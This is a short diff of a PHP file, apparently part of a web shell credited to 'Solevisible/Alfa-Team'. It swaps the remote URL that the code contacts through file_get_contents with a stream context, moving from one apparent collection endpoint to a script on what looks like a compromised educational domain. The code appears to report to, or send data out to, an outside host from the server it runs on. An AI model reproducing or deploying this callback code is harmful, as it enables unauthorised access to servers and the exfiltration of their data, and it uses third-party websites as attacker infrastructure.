@@ -18,7 +18,7 @@ $options = array(
 );
 
 $context  = stream_context_create($options);
-$result = file_get_contents('http://preydev.wuaze.com/anhphongdepchai/connect.php', false, $context);
+$result = file_get_contents('https://thuvienso.caodang20.edu.vn/bin/app.php', false, $context);
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
